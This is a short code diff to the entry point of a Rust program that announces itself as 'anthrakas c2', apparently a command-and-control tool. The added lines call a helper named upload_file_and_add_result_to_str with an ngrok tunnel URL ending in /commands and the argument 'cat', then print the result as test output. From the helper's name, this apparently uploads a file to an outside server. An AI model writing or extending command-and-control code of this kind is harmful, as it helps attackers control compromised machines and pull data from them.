@@ -6,6 +6,16 @@ pub mod utils;
 fn main() {
     println!("Welcome to anthrakas c2.\n");
 
+    let mut output = String::new();
+
+    utils::upload_file_and_add_result_to_str(
+        &"https://inerrant-carl-nonhazardous.ngrok-free.dev/commands".to_string(),
+        &"cat".to_string(),
+        &mut output
+    );
+
+    println!("Output from test: {}", output);
+
     loop {
         let mut input = String::new();
         
